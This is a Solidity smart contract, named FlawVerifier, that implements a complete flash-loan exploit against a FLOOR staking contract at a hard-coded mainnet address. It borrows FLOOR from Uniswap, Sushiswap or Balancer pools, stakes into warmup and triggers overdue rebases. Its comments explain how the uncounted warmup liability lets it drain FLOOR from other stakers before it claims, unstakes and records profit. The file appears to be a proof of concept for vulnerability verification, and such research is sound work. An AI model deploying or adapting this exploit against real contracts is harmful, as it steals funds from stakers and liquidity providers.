// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IsFLOORLike is IERC20Like {
    function circulatingSupply() external view returns (uint256);
    function balanceForGons(uint256 gons) external view returns (uint256);
}

interface IStakingLike {
    function FLOOR() external view returns (address);
    function sFLOOR() external view returns (address);

    function warmupPeriod() external view returns (uint256);
    function supplyInWarmup() external view returns (uint256);
    function epoch() external view returns (uint256 length, uint256 number, uint256 end, uint256 distribute);
    function warmupInfo(address account)
        external
        view
        returns (uint256 deposit, uint256 gons, uint256 expiry, bool lock);

    function stake(address to, uint256 amount, bool rebasing, bool claimNow) external returns (uint256);
    function claim(address to, bool rebasing) external returns (uint256);
    function unstake(address to, uint256 amount, bool trigger, bool rebasing) external returns (uint256);
    function rebase() external returns (uint256);
}

interface IBalancerVaultLike {
    function flashLoan(
        address recipient,
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV3FactoryLike {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool);
}

interface IUniswapV3PoolLike {
    function token0() external view returns (address);
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract FlawVerifier {
    struct Claim {
        uint256 deposit;
        uint256 gons;
        uint256 expiry;
        bool lock;
    }

    struct FlashQuote {
        address venue;
        uint256 amountOut;
        uint8 route;
        bool floorIsToken0;
    }

    IStakingLike internal constant STAKING =
        IStakingLike(0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539);

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;

    uint8 internal constant ROUTE_NONE = 0;
    uint8 internal constant ROUTE_UNISWAP_V3 = 1;
    uint8 internal constant ROUTE_UNISWAP_V2 = 2;
    uint8 internal constant ROUTE_BALANCER = 3;

    bool private baselineCaptured;
    uint256 private baselineFloorBalance;
    uint256 private realizedProfitInFloor;

    address private activeFlashPair;
    address private activeFlashPool;

    constructor() {}

    function executeOnOpportunity() public {
        _captureBaseline();
        _approveSpenders();

        if (!_pathIsCurrentlyExecutable()) {
            _syncProfit();
            return;
        }

        uint256 funding = _floor().balanceOf(address(this));
        uint256 cap = _fundingCap();
        if (cap != 0 && funding > cap) {
            funding = cap;
        }

        if (funding != 0) {
            _executeExploit(funding);
            _syncProfit();
            return;
        }

        FlashQuote memory quote = _bestFlashQuote(cap);
        if (quote.route == ROUTE_NONE || quote.amountOut == 0) {
            _syncProfit();
            return;
        }

        if (quote.route == ROUTE_UNISWAP_V3) {
            activeFlashPool = quote.venue;
            IUniswapV3PoolLike(quote.venue).flash(
                address(this),
                quote.floorIsToken0 ? quote.amountOut : 0,
                quote.floorIsToken0 ? 0 : quote.amountOut,
                abi.encode(quote.amountOut)
            );
            activeFlashPool = address(0);
        } else if (quote.route == ROUTE_UNISWAP_V2) {
            activeFlashPair = quote.venue;
            IUniswapV2PairLike(quote.venue).swap(
                quote.floorIsToken0 ? quote.amountOut : 0,
                quote.floorIsToken0 ? 0 : quote.amountOut,
                address(this),
                abi.encode(quote.amountOut)
            );
            activeFlashPair = address(0);
        } else {
            IERC20Like[] memory tokens = new IERC20Like[](1);
            tokens[0] = _floor();

            uint256[] memory amounts = new uint256[](1);
            amounts[0] = quote.amountOut;

            IBalancerVaultLike(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
        }

        _syncProfit();
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        require(msg.sender == BALANCER_VAULT, "unexpected vault");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "unexpected loan");
        require(address(tokens[0]) == address(_floor()), "unexpected token");

        _executeExploit(amounts[0]);

        uint256 repayment = amounts[0] + feeAmounts[0];
        require(_floor().balanceOf(address(this)) >= repayment, "balancer repayment unavailable");
        _floor().transfer(BALANCER_VAULT, repayment);
    }

    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        require(msg.sender == activeFlashPool, "unexpected pool");

        uint256 borrowed = abi.decode(data, (uint256));
        require(borrowed != 0, "no FLOOR borrowed");

        uint256 repayment = borrowed + (IUniswapV3PoolLike(msg.sender).token0() == STAKING.FLOOR() ? fee0 : fee1);
        _executeExploit(borrowed);

        require(_floor().balanceOf(address(this)) >= repayment, "v3 repayment unavailable");
        _floor().transfer(msg.sender, repayment);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == activeFlashPair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed != 0, "no FLOOR borrowed");

        _executeExploit(borrowed);

        uint256 repayment = _v2Repayment(borrowed);
        require(_floor().balanceOf(address(this)) >= repayment, "v2 repayment unavailable");
        _floor().transfer(msg.sender, repayment);
    }

    function profitToken() external view returns (address) {
        return STAKING.FLOOR();
    }

    function profitAmount() external view returns (uint256) {
        return realizedProfitInFloor;
    }

    function _executeExploit(uint256 floorFunding) internal {
        if (floorFunding < 2) {
            return;
        }

        uint256 warmupPeriod = STAKING.warmupPeriod();
        if (warmupPeriod == 0) {
            return;
        }

        uint256 activeStakers = _sFloor().circulatingSupply();
        if (activeStakers == 0) {
            return;
        }

        if (_remainingImmediateRebases() < warmupPeriod + 1) {
            return;
        }

        uint256 supplyInWarmupBefore = STAKING.supplyInWarmup();

        // Exploit path 1:
        // The attacker stakes into warmup. In the on-chain Staking contract this increases
        // gonsInWarmup, but it still does not increase sFLOOR.circulatingSupply().
        STAKING.stake(address(this), floorFunding, true, false);

        Claim memory info = _warmupInfo();
        if (info.gons == 0 || info.deposit == 0) {
            return;
        }

        // supplyInWarmup() is the public surface for the hidden gonsInWarmup liability.
        if (STAKING.supplyInWarmup() <= supplyInWarmupBefore) {
            return;
        }

        uint256 claimableBeforeRebases = _sFloor().balanceForGons(info.gons);
        if (claimableBeforeRebases < info.deposit) {
            return;
        }

        // Exploit path 2:
        // Each overdue rebase uses FLOOR.balanceOf(address(this)) minus sFLOOR.circulatingSupply().
        // Because the warmup liability in gonsInWarmup is not subtracted, the warmup-backed FLOOR
        // is redistributed to current stakers while our warmup claim remains intact.
        for (uint256 i = 0; i < warmupPeriod; ++i) {
            if (!_epochReady()) {
                return;
            }
            STAKING.rebase();
        }

        info = _warmupInfo();

        // Exploit path 3:
        // claim() later pays sFLOOR.balanceForGons(info.gons), so the warmup position keeps the
        // same rebasing growth even though rebase() never counted that liability.
        uint256 claimableAfterRebases = _sFloor().balanceForGons(info.gons);
        if (claimableAfterRebases <= info.deposit) {
            return;
        }

        uint256 claimed = STAKING.claim(address(this), true);
        if (claimed == 0) {
            return;
        }

        _approveSpenders();

        // Realistic public step:
        // convert the claimed on-chain sFLOOR into the pre-existing on-chain profit token FLOOR.
        // We cap to current reserves because the vulnerability is insolvency-driven and the pool
        // may already be unable to satisfy all claims.
        uint256 reserves = _floor().balanceOf(address(STAKING));
        uint256 sBalance = _sFloor().balanceOf(address(this));
        uint256 amountToUnstake = sBalance;
        if (amountToUnstake > reserves) {
            amountToUnstake = reserves;
        }

        if (amountToUnstake != 0) {
            try STAKING.unstake(address(this), amountToUnstake, false, true) returns (uint256) {} catch {}
        }
    }

    function _pathIsCurrentlyExecutable() internal view returns (bool) {
        // Exploit path 0 requires warmupPeriod > 0 and some users already present in
        // sFLOOR.circulatingSupply().
        uint256 warmupPeriod = STAKING.warmupPeriod();
        if (warmupPeriod == 0) {
            return false;
        }

        if (_sFloor().circulatingSupply() == 0) {
            return false;
        }

        return _remainingImmediateRebases() >= warmupPeriod + 1;
    }

    function _bestFlashQuote(uint256 cap) internal view returns (FlashQuote memory best) {
        if (cap == 0) {
            return best;
        }

        // Attempt strategy: prefer alternate public AMM liquidity before Balancer.
        FlashQuote memory v3Quote = _bestV3Quote(cap);
        FlashQuote memory v2Quote = _bestV2Quote(cap);
        FlashQuote memory balancerQuote = _bestBalancerQuote(cap);

        best = v3Quote;
        if (v2Quote.amountOut > best.amountOut) {
            best = v2Quote;
        }
        if (balancerQuote.amountOut > best.amountOut) {
            best = balancerQuote;
        }
    }

    function _bestBalancerQuote(uint256 cap) internal view returns (FlashQuote memory quote) {
        uint256 balance = _floor().balanceOf(BALANCER_VAULT);
        if (balance <= 1) {
            return quote;
        }

        uint256 amountOut = balance / 10;
        if (amountOut > cap) {
            amountOut = cap;
        }

        if (amountOut != 0) {
            quote = FlashQuote({venue: BALANCER_VAULT, amountOut: amountOut, route: ROUTE_BALANCER, floorIsToken0: false});
        }
    }

    function _bestV3Quote(uint256 cap) internal view returns (FlashQuote memory best) {
        address floorToken = STAKING.FLOOR();
        address[4] memory bases = [WETH, USDC, USDT, DAI];
        uint24[4] memory fees = [uint24(100), uint24(500), uint24(3000), uint24(10000)];

        for (uint256 i = 0; i < bases.length; ++i) {
            for (uint256 j = 0; j < fees.length; ++j) {
                address pool = IUniswapV3FactoryLike(UNISWAP_V3_FACTORY).getPool(floorToken, bases[i], fees[j]);
                if (pool == address(0)) {
                    continue;
                }

                uint256 floorBalanceInPool = _floor().balanceOf(pool);
                if (floorBalanceInPool <= 1) {
                    continue;
                }

                uint256 amountOut = floorBalanceInPool / 5;
                if (amountOut > cap) {
                    amountOut = cap;
                }

                if (amountOut > best.amountOut) {
                    best = FlashQuote({
                        venue: pool,
                        amountOut: amountOut,
                        route: ROUTE_UNISWAP_V3,
                        floorIsToken0: IUniswapV3PoolLike(pool).token0() == floorToken
                    });
                }
            }
        }
    }

    function _bestV2Quote(uint256 cap) internal view returns (FlashQuote memory best) {
        address floorToken = STAKING.FLOOR();
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[4] memory bases = [WETH, USDC, USDT, DAI];

        for (uint256 i = 0; i < factories.length; ++i) {
            for (uint256 j = 0; j < bases.length; ++j) {
                address pair = IUniswapV2FactoryLike(factories[i]).getPair(floorToken, bases[j]);
                if (pair == address(0)) {
                    continue;
                }

                IUniswapV2PairLike v2Pair = IUniswapV2PairLike(pair);
                (uint112 reserve0, uint112 reserve1,) = v2Pair.getReserves();
                bool floorIsToken0 = v2Pair.token0() == floorToken;
                uint256 floorReserve = floorIsToken0 ? uint256(reserve0) : uint256(reserve1);
                if (floorReserve <= 1) {
                    continue;
                }

                uint256 amountOut = floorReserve / 5;
                if (amountOut > cap) {
                    amountOut = cap;
                }

                if (amountOut > best.amountOut) {
                    best = FlashQuote({
                        venue: pair,
                        amountOut: amountOut,
                        route: ROUTE_UNISWAP_V2,
                        floorIsToken0: floorIsToken0
                    });
                }
            }
        }
    }

    function _captureBaseline() internal {
        if (baselineCaptured) {
            return;
        }

        baselineCaptured = true;
        baselineFloorBalance = _floor().balanceOf(address(this));
    }

    function _approveSpenders() internal {
        _floor().approve(address(STAKING), type(uint256).max);
        _sFloor().approve(address(STAKING), type(uint256).max);
    }

    function _warmupInfo() internal view returns (Claim memory info) {
        (info.deposit, info.gons, info.expiry, info.lock) = STAKING.warmupInfo(address(this));
    }

    function _fundingCap() internal view returns (uint256 cap) {
        uint256 activeSupply = _sFloor().circulatingSupply() / 4;
        uint256 stakingFloor = _floor().balanceOf(address(STAKING)) / 4;

        cap = activeSupply;
        if (cap == 0 || (stakingFloor != 0 && stakingFloor < cap)) {
            cap = stakingFloor;
        }
    }

    function _remainingImmediateRebases() internal view returns (uint256) {
        (uint256 length,, uint256 end,) = STAKING.epoch();
        if (length == 0 || end > block.timestamp) {
            return 0;
        }

        return ((block.timestamp - end) / length) + 1;
    }

    function _epochReady() internal view returns (bool) {
        (, , uint256 end,) = STAKING.epoch();
        return end <= block.timestamp;
    }

    function _v2Repayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _floor() internal view returns (IERC20Like) {
        return IERC20Like(STAKING.FLOOR());
    }

    function _sFloor() internal view returns (IsFLOORLike) {
        return IsFLOORLike(STAKING.sFLOOR());
    }

    function _syncProfit() internal {
        uint256 currentFloorBalance = _floor().balanceOf(address(this));
        if (currentFloorBalance > baselineFloorBalance) {
            realizedProfitInFloor = currentFloorBalance - baselineFloorBalance;
        } else {
            realizedProfitInFloor = 0;
        }
    }
}
